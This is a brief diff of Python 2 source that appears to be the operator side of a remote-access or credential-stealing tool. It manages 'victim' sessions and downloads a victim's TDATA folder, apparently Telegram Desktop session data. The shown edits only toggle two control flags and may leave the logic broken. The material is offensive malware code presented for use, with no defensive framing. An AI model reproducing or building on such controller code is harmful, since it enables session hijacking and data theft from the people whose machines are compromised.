@@ -311,7 +311,7 @@ while True:
                                     try:
                                         victim.send('break')
                                     except socket.error:
-                                        csf=True
+                                        csf=False
                                         print Back.BLUE+"\nSession Closed\n"
                                     break
                                 elif check_integer(select_user)==True:
@@ -331,7 +331,7 @@ while True:
                                         print "\nInvalid ID\n"
                                 else:
                                     print "\nInvalid ID\n"
-                            rd=True
+                            rd=None
                             if licen_download_tdata=='yes':
                                 print Fore.MAGENTA+'\nStart Download (TDATA) Folder\n'+Fore.GREEN+'============================='
                                 print ''
